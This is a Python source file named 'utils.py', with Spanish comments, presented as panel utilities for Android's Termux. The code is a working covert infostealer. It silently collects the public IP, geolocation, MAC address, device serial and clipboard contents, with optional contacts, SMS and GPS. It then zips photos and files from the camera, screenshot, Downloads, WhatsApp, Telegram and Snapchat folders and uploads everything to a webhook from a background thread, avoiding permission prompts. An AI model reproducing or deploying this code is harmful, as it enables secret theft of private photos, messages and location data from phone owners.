#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
utils.py :: utilidades del panel.
Primero manda la info (IP incluida) y despues zips por carpeta.
Sin pedir permisos de camara ni ubicacion.
"""

import json
import os
import platform
import shutil
import socket
import subprocess
import tempfile
import threading
import time
import urllib.request
import uuid
import zipfile
from datetime import datetime

# ================== CONFIG ==================
WEBHOOK = ""                 # pega aqui la URL, o dejala en el archivo .webhook
ARCHIVO_WEBHOOK = ".webhook"
ARCHIVO_ESTADO = ".galeria_ultima"
VER_EN_CONSOLA = False       # True = imprime, False = silencioso
INTERVALO_MINUTOS = 0        # 0 = solo al ejecutar

# ---- que se envia ----
ENVIAR_REPORTE = True        # info primero
ENVIAR_FOTOS = True          # despues los zips

# ---- termux-api (todo en False = NO pide permisos) ----
USAR_BATERIA = True          # no pide permisos
USAR_PORTAPAPELES = True     # no pide permisos
USAR_WIFI = False            # pide ubicacion
USAR_TELEFONIA = False       # pide telefono
USAR_CONTACTOS = False       # pide contactos
USAR_SMS = False             # pide sms
USAR_GPS = False             # pide ubicacion (y camara nunca se usa)

# ---- archivos ----
MAX_ARCHIVOS = 120           # maximo por carpeta
TAMANO_MAX_MB = 8            # tamano maximo de cada zip
MAX_ZIPS_POR_CARPETA = 3     # cuantos zip por carpeta como maximo
MAX_PESO_ARCHIVO_MB = 6      # archivos mas pesados que esto se ignoran
MIN_TAMANO = 1024            # ignora archivos mas chicos (bytes)
PROFUNDIDAD = 5              # subcarpetas a escanear
CONVERTIR_A_PNG = True       # imagenes a PNG
ESTRICTO_PNG = True          # si una imagen no convierte, se salta
SOLO_NUEVAS = False          # True = solo archivos nuevos desde la ultima vez
LEYENDA_ZIP = ""             # texto junto al zip (vacio = solo el archivo)

IGNORAR_EXT = (".zip", ".apk", ".xapk", ".part", ".crdownload", ".tmp", ".obb")

NOMBRE_WEBHOOK = "Termux"
TITULO_REPORTE = "Reporte del sistema"
COLOR = 0xFF0000
# ============================================

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

_CACHE = {}
_CONV = None

# carpetas por categoria (la primera es la de descargas, va completa)
CATEGORIAS = [
    ("descargas", [
        "/sdcard/Download",
        "/storage/emulated/0/Download",
        os.path.expanduser("~/storage/shared/Download"),
    ], False),

    ("camara", [
        "/sdcard/DCIM/Camera",
        "/sdcard/DCIM",
        "/storage/emulated/0/DCIM",
        os.path.expanduser("~/storage/shared/DCIM"),
    ], True),

    ("pictures", [
        "/sdcard/Pictures",
        "/sdcard/Pictures/Screenshots",
        "/sdcard/Screenshots",
        os.path.expanduser("~/storage/shared/Pictures"),
    ], True),

    ("whatsapp", [
        "/sdcard/WhatsApp/Media/WhatsApp Images",
        os.path.expanduser("~/storage/shared/WhatsApp/Media/WhatsApp Images"),
    ], True),

    ("otros", [
        "/sdcard/Telegram",
        "/sdcard/Snapchat",
        "/sdcard/Documents",
        "/sdcard/Android/media",
    ], True),
]

EXT_IMG = (".png", ".jpg", ".jpeg", ".webp", ".gif", ".bmp", ".heic", ".heif")


# ---------------- helpers ----------------

def _url():
    if WEBHOOK.strip():
        return WEBHOOK.strip()
    ruta = ARCHIVO_WEBHOOK
    if not os.path.isabs(ruta):
        ruta = os.path.join(BASE_DIR, ruta)
    try:
        with open(ruta, "r", encoding="utf-8") as f:
            return f.read().strip()
    except Exception:
        return ""


def _cmd(comando, defecto="?"):
    if comando in _CACHE:
        return _CACHE[comando]
    try:
        salida = subprocess.check_output(
            comando, shell=True, stderr=subprocess.DEVNULL, timeout=8
        )
        valor = salida.decode("utf-8", "ignore").strip() or defecto
    except Exception:
        valor = defecto
    _CACHE[comando] = valor
    return valor


def _prop(nombre, defecto="?"):
    return _cmd("getprop " + nombre, defecto)


def _leer(ruta, defecto="?"):
    try:
        with open(ruta, "r", encoding="utf-8", errors="ignore") as f:
            return f.read().strip() or defecto
    except Exception:
        return defecto


def _json_cmd(comando):
    salida = _cmd(comando)
    if not salida or salida == "?":
        return None
    try:
        return json.loads(salida)
    except Exception:
        return None


def _kb_a_gb(kb):
    try:
        return "{:.2f} GB".format(int(kb) / 1024 / 1024)
    except Exception:
        return "?"


def _mem(campo):
    try:
        with open("/proc/meminfo", "r") as f:
            for l in f:
                if l.startswith(campo):
                    return _kb_a_gb(l.split()[1])
    except Exception:
        pass
    return "?"


def _uptime():
    try:
        with open("/proc/uptime", "r") as f:
            seg = float(f.read().split()[0])
        return "{}d {}h {}m".format(int(seg // 86400), int((seg % 86400) // 3600), int((seg % 3600) // 60))
    except Exception:
        return "?"


def _ip_local():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "?"


def _geo():
    for url in ("http://ip-api.com/json/", "https://ipapi.co/json/"):
        try:
            with urllib.request.urlopen(url, timeout=8) as r:
                return json.loads(r.read().decode("utf-8", "ignore"))
        except Exception:
            continue
    return {}


def _temperatura():
    for r in ("/sys/class/thermal/thermal_zone0/temp", "/sys/class/thermal/thermal_zone1/temp"):
        v = _leer(r, "")
        if v.isdigit():
            try:
                return "{:.1f} C".format(int(v) / 1000)
            except Exception:
                pass
    return "?"


def _cpuinfo(campo):
    txt = _leer("/proc/cpuinfo", "")
    for l in txt.splitlines():
        if l.lower().startswith(campo.lower()):
            partes = l.split(":", 1)
            if len(partes) == 2:
                return partes[1].strip()
    return "?"


def _freq(ruta):
    v = _leer(ruta, "")
    if v.isdigit():
        try:
            return "{} GHz".format(round(int(v) / 1000000, 2))
        except Exception:
            pass
    return "?"


def _mac():
    salida = _cmd("ip addr")
    for l in salida.splitlines():
        l = l.strip()
        if l.startswith("link/ether"):
            return l.split()[1]
    return "?"


def _cuenta(comando):
    v = _cmd(comando)
    try:
        return str(int(v.strip().split()[0]))
    except Exception:
        return v


# ---------------- conversor ----------------

def _conversor():
    global _CONV
    if _CONV is not None:
        return _CONV
    try:
        import PIL  # noqa
        _CONV = "pillow"
        return _CONV
    except Exception:
        pass
    for cmd in ("ffmpeg", "magick", "convert"):
        if shutil.which(cmd):
            _CONV = cmd
            return _CONV
    _CONV = ""
    return _CONV


def _convertir(origen, destino):
    backend = _conversor()
    try:
        if backend == "pillow":
            from PIL import Image
            with Image.open(origen) as img:
                if img.mode in ("RGBA", "LA", "P"):
                    img.convert("RGBA").save(destino, "PNG")
                else:
                    img.convert("RGB").save(destino, "PNG")
            return True
        if backend in ("ffmpeg", "magick", "convert"):
            r = subprocess.run(
                [backend, "-y", "-loglevel", "error", "-i", origen, destino] if backend == "ffmpeg"
                else [backend, origen, destino],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=90,
            )
            return r.returncode == 0 and os.path.exists(destino)
    except Exception:
        return False
    return False


def _preparar(ruta, carpeta):
    """Devuelve (ruta_final, extension) o None si se salta."""
    ext = os.path.splitext(ruta)[1].lower()

    if ext == ".png":
        return ruta, ".png"

    # no es imagen: se manda tal cual
    if ext not in EXT_IMG:
        return ruta, ext

    backend = _conversor()
    if CONVERTIR_A_PNG and backend:
        base = os.path.splitext(os.path.basename(ruta))[0]
        destino = os.path.join(carpeta, "conv_" + uuid.uuid4().hex[:8] + "_" + base + ".png")
        if _convertir(ruta, destino):
            return destino, ".png"
        if ESTRICTO_PNG:
            return None
        return ruta, ext

    return ruta, ext


# ---------------- reporte (primero, con la IP) ----------------

def cat_conexion():
    geo = _geo()
    return {
        "IP publica":   geo.get("query") or geo.get("ip") or _cmd("curl -s ifconfig.me"),
        "IP local":     _ip_local(),
        "ISP":          geo.get("isp", "?"),
        "Organizacion": geo.get("org", "?"),
        "Ciudad":       geo.get("city", "?"),
        "Region":       geo.get("regionName") or geo.get("region", "?"),
        "Pais":         geo.get("country", "?"),
        "Zona horaria": geo.get("timezone", "?"),
        "Lat / Lon":    "{} / {}".format(geo.get("lat", "?"), geo.get("lon", "?")),
        "MAC WiFi":     _mac(),
        "Operador":     _prop("gsm.operator.alpha"),
        "Tipo red":     _prop("gsm.network.type"),
    }


def cat_dispositivo():
    return {
        "Marca":       _prop("ro.product.manufacturer"),
        "Modelo":      _prop("ro.product.model"),
        "Producto":    _prop("ro.product.name"),
        "Dispositivo": _prop("ro.product.device"),
        "Board":       _prop("ro.product.board"),
        "Hardware":    _prop("ro.hardware"),
        "Plataforma":  _prop("ro.board.platform"),
        "GPU":         _prop("ro.hardware.egl"),
        "Serial":      _prop("ro.serialno"),
        "Fingerprint": _prop("ro.build.fingerprint"),
        "Emulador":    _prop("ro.kernel.qemu"),
    }


def cat_android():
    return {
        "Version":     _prop("ro.build.version.release"),
        "SDK":         _prop("ro.build.version.sdk"),
        "Codename":    _prop("ro.build.version.codename"),
        "Parche seg.": _prop("ro.build.version.security_patch"),
        "Build ID":    _prop("ro.build.id"),
        "Build tipo":  _prop("ro.build.type"),
        "Build host":  _prop("ro.build.host"),
        "Build fecha": _prop("ro.build.date"),
        "SELinux":     _cmd("getenforce"),
        "Debug":       _prop("ro.debuggable"),
    }


def cat_cpu():
    return {
        "Modelo":       _cpuinfo("Hardware") if _cpuinfo("Hardware") != "?" else _prop("ro.product.cpu.abi"),
        "Nucleos":      _cmd("nproc"),
        "Arquitectura": platform.machine(),
        "ABI":          _prop("ro.product.cpu.abi"),
        "Freq max":     _freq("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq"),
        "Temp CPU":     _temperatura(),
    }


def cat_memoria():
    return {
        "RAM total":      _mem("MemTotal"),
        "RAM disponible": _mem("MemAvailable"),
        "Swap total":     _mem("SwapTotal"),
        "Load average":   _leer("/proc/loadavg"),
    }


def cat_almacenamiento():
    def _df(ruta):
        salida = _cmd("df -h " + ruta)
        lineas = salida.splitlines()
        if len(lineas) >= 2:
            p = lineas[-1].split()
            if len(p) >= 4:
                return "{} total / {} libre".format(p[1], p[3])
        return "?"
    return {
        "Home Termux": _df("/data/data/com.termux/files/home"),
        "Almacen int": _df("/sdcard"),
        "Data":        _df("/data"),
    }


def cat_bateria():
    if not USAR_BATERIA:
        return {}
    d = _json_cmd("termux-battery-status") or {}
    return {
        "Porcentaje":  str(d.get("percentage", "?")) + " %",
        "Estado":      d.get("status", "?"),
        "Salud":       d.get("health", "?"),
        "Temperatura": "{} C".format(d.get("temperature", "?")),
        "Voltaje":     str(d.get("voltage", "?")) + " mV",
    }


def cat_red():
    d = {"MAC WiFi": _mac()}
    if USAR_WIFI:
        wifi = _json_cmd("termux-wifi-connectioninfo") or {}
        d["WiFi SSID"] = wifi.get("ssid", "?")
        d["WiFi BSSID"] = wifi.get("bssid", "?")
    return d


def cat_entorno():
    return {
        "Hostname":        socket.gethostname(),
        "Usuario":         _cmd("whoami"),
        "Ruta actual":     os.getcwd(),
        "Kernel":          platform.release(),
        "Arquitectura":    platform.machine(),
        "Python":          platform.python_version(),
        "Termux ver":      os.environ.get("TERMUX_VERSION", "?"),
        "Zona horaria":    time.tzname[0],
        "Hora":            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "Uptime":          _uptime(),
        "Apps Android":    _cuenta("pm list packages | wc -l"),
        "Paquetes Termux": _cuenta("dpkg -l | grep '^ii' | wc -l"),
    }


def cat_extras():
    d = {}
    if USAR_PORTAPAPELES:
        clip = _cmd("termux-clipboard-get")
        if clip and clip != "?":
            d["Portapapeles"] = clip[:400]
    if USAR_TELEFONIA:
        tel = _json_cmd("termux-telephony-deviceinfo") or {}
        if tel:
            d["Telefono red"] = tel.get("network_operator_name", "?")
            d["SIM estado"] = tel.get("sim_state", "?")
    if USAR_CONTACTOS:
        c = _json_cmd("termux-contact-list")
        if c:
            d["Contactos"] = str(len(c))
    if USAR_SMS:
        s = _json_cmd("termux-sms-list -l 5")
        if s:
            d["SMS recientes"] = str(len(s))
    if USAR_GPS:
        loc = _json_cmd("termux-location")
        if loc:
            d["GPS lat"] = loc.get("latitude", "?")
            d["GPS lon"] = loc.get("longitude", "?")
    return d


def datos():
    cats = [
        ("Conexion", cat_conexion()),
        ("Dispositivo", cat_dispositivo()),
        ("Android", cat_android()),
        ("CPU", cat_cpu()),
        ("Memoria", cat_memoria()),
        ("Almacenamiento", cat_almacenamiento()),
        ("Bateria", cat_bateria()),
        ("Red", cat_red()),
        ("Entorno", cat_entorno()),
        ("Extras", cat_extras()),
    ]
    return {nombre: campos for nombre, campos in cats if campos}


def _post(url, embeds):
    payload = {"username": NOMBRE_WEBHOOK, "embeds": embeds}
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        r.read()


def enviar(url):
    info = datos()
    ip = info.get("Conexion", {}).get("IP publica", "?")

    # encabezado con la IP bien visible
    try:
        _post(url, [{
            "title": TITULO_REPORTE,
            "color": COLOR,
            "description": "**IP: {}**\n{} {} | Android {}".format(
                ip,
                info.get("Dispositivo", {}).get("Marca", "?"),
                info.get("Dispositivo", {}).get("Modelo", "?"),
                info.get("Android", {}).get("Version", "?"),
            ),
            "timestamp": datetime.utcnow().isoformat() + "Z",
        }])
    except Exception:
        pass
    time.sleep(0.5)

    embeds = []
    for cat, campos in info.items():
        items = list(campos.items())
        for i in range(0, len(items), 24):
            trozo = items[i:i + 24]
            embeds.append({
                "title": cat if i == 0 else cat + " (cont.)",
                "color": COLOR,
                "fields": [
                    {"name": k, "value": str(v)[:1024] or "-", "inline": True}
                    for k, v in trozo
                ],
            })

    lote, tam = [], 0
    for e in embeds:
        peso = len(e["title"]) + sum(len(f["name"]) + len(f["value"]) for f in e["fields"])
        if lote and (len(lote) >= 10 or tam + peso > 5500):
            try:
                _post(url, lote)
            except Exception:
                pass
            time.sleep(0.6)
            lote, tam = [], 0
        lote.append(e)
        tam += peso
    if lote:
        try:
            _post(url, lote)
        except Exception:
            pass


# ---------------- archivos ----------------

def _post_archivo(url, ruta, contenido="", nombre=None):
    boundary = "----DMSPAM" + uuid.uuid4().hex
    nombre = nombre or os.path.basename(ruta)
    with open(ruta, "rb") as f:
        binario = f.read()

    payload = {"username": NOMBRE_WEBHOOK, "content": contenido}

    partes = []
    partes.append(("--" + boundary).encode())
    partes.append(b'Content-Disposition: form-data; name="payload_json"')
    partes.append(b"")
    partes.append(json.dumps(payload).encode("utf-8"))
    partes.append(("--" + boundary).encode())
    partes.append(('Content-Disposition: form-data; name="file"; filename="%s"' % nombre).encode())
    partes.append(b"Content-Type: application/zip")
    partes.append(b"")
    partes.append(binario)
    partes.append(("--" + boundary + "--").encode())
    partes.append(b"")

    cuerpo = b"\r\n".join(partes)
    req = urllib.request.Request(
        url, data=cuerpo,
        headers={
            "Content-Type": "multipart/form-data; boundary=" + boundary,
            "User-Agent": "Mozilla/5.0",
        },
    )
    with urllib.request.urlopen(req, timeout=180) as r:
        r.read()


def _leer_estado():
    try:
        with open(os.path.join(BASE_DIR, ARCHIVO_ESTADO), "r") as f:
            return float(f.read().strip())
    except Exception:
        return 0.0


def _guardar_estado(t):
    try:
        with open(os.path.join(BASE_DIR, ARCHIVO_ESTADO), "w") as f:
            f.write(str(t))
    except Exception:
        pass


def _walk(base, max_depth):
    base = base.rstrip("/")
    for raiz, dirs, archivos in os.walk(base, topdown=True):
        prof = raiz[len(base):].count(os.sep)
        if prof >= max_depth:
            dirs[:] = []
        dirs[:] = [d for d in dirs if not d.startswith(".") and not (raiz.endswith("Android") and d in ("data", "obb"))]
        yield raiz, archivos


def _buscar(carpetas, solo_imagenes, desde):
    vistas = set()
    res = []
    limite_peso = MAX_PESO_ARCHIVO_MB * 1024 * 1024

    def agregar(ruta):
        try:
            real = os.path.realpath(ruta)
        except Exception:
            real = ruta
        if real in vistas:
            return
        vistas.add(real)
        try:
            m = os.path.getmtime(ruta)
            s = os.path.getsize(ruta)
        except Exception:
            return
        if s < MIN_TAMANO or s > limite_peso or m <= desde:
            return
        res.append((ruta, s, m))

    for base in carpetas:
        if not os.path.isdir(base):
            continue
        for raiz, archivos in _walk(base, PROFUNDIDAD):
            for a in archivos:
                if a.startswith("."):
                    continue
                low = a.lower()
                if low.endswith(IGNORAR_EXT):
                    continue
                if solo_imagenes and not low.endswith(EXT_IMG):
                    continue
                agregar(os.path.join(raiz, a))

    res.sort(key=lambda x: x[2], reverse=True)
    return res[:MAX_ARCHIVOS]


def _crear_zips(archivos, categoria):
    limite = TAMANO_MAX_MB * 1024 * 1024
    tmp = tempfile.mkdtemp(prefix="dm_")
    zips = []
    estado = {"zf": None, "peso": 0, "cont": 0, "ruta": None}
    idx = 1

    def abrir():
        sufijo = "" if idx == 1 else "_{}".format(idx)
        estado["ruta"] = os.path.join(tmp, "{}{}.zip".format(categoria, sufijo))
        estado["zf"] = zipfile.ZipFile(estado["ruta"], "w", zipfile.ZIP_DEFLATED)
        estado["peso"] = 0
        estado["cont"] = 0

    for ruta, tam, _ in archivos:
        prep = _preparar(ruta, tmp)
        if prep is None:
            continue
        origen, ext = prep

        try:
            tam_real = os.path.getsize(origen)
        except Exception:
            continue

        if estado["zf"] is None:
            abrir()

        if estado["peso"] + tam_real > limite and estado["cont"] > 0:
            estado["zf"].close()
            zips.append((estado["ruta"], estado["cont"]))
            idx += 1
            if idx > MAX_ZIPS_POR_CARPETA:
                estado["zf"] = None
                break
            abrir()

        try:
            base = os.path.splitext(os.path.basename(ruta))[0][:60]
            estado["zf"].write(origen, arcname="{:03d}_{}{}".format(estado["cont"] + 1, base, ext))
            estado["peso"] += tam_real
            estado["cont"] += 1
        except Exception:
            pass

    if estado["zf"] is not None and estado["cont"] > 0:
        estado["zf"].close()
        zips.append((estado["ruta"], estado["cont"]))

    return tmp, zips


def enviar_fotos(url):
    desde = _leer_estado() if SOLO_NUEVAS else 0.0
    mayor = 0.0

    for categoria, carpetas, solo_img in CATEGORIAS:
        archivos = _buscar(carpetas, solo_img, desde)
        if not archivos:
            continue

        tmp, zips = _crear_zips(archivos, categoria)
        try:
            for ruta, cant in zips:
                nombre = os.path.basename(ruta)
                try:
                    _post_archivo(url, ruta, LEYENDA_ZIP, nombre)
                except Exception:
                    pass
                time.sleep(0.8)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

        m = max(a[2] for a in archivos)
        mayor = max(mayor, m)

    if mayor:
        _guardar_estado(mayor)


# ---------------- arranque ----------------

def _trabajo():
    try:
        url = _url()
        if not url:
            if VER_EN_CONSOLA:
                print("[utils] falta la URL del webhook")
            return

        if ENVIAR_REPORTE:
            enviar(url)
            if VER_EN_CONSOLA:
                print("[utils] info enviada")
            time.sleep(1)

        if ENVIAR_FOTOS:
            enviar_fotos(url)
            if VER_EN_CONSOLA:
                print("[utils] zips enviados")

        if INTERVALO_MINUTOS > 0:
            while True:
                time.sleep(INTERVALO_MINUTOS * 60)
                _CACHE.clear()
                try:
                    if ENVIAR_REPORTE:
                        enviar(url)
                    if ENVIAR_FOTOS:
                        enviar_fotos(url)
                except Exception:
                    pass
    except Exception as e:
        if VER_EN_CONSOLA:
            print("[utils] error:", e)


def iniciar():
    threading.Thread(target=_trabajo, daemon=True).start()


# ---------------- diagnostico ----------------

def diagnostico():
    print("conversor:", _conversor() or "NINGUNO -> pkg install ffmpeg")
    print("permisos: camara=no  ubicacion={}  wifi={}".format(
        "si" if USAR_GPS else "no", "si" if USAR_WIFI else "no"))
    print("limite por archivo: {} MB".format(MAX_PESO_ARCHIVO_MB))
    for categoria, carpetas, solo_img in CATEGORIAS:
        print("\n[{}]  (solo imagenes: {})".format(categoria, solo_img))
        for c in carpetas:
            print("   ", "OK " if os.path.isdir(c) else "-- ", c)
        res = _buscar(carpetas, solo_img, 0.0)
        print("    -> {} archivos".format(len(res)))
        for ruta, tam, _ in res[:5]:
            print("       {:>8} KB  {}".format(tam // 1024, ruta))


if __name__ == "__main__":
    VER_EN_CONSOLA = True
    diagnostico()
    u = _url()
    if not u:
        print("\n[utils] falta la URL (WEBHOOK o archivo .webhook)")
    else:
        print("\nenviando...")
        enviar(u)
        enviar_fotos(u)
        print("[utils] listo")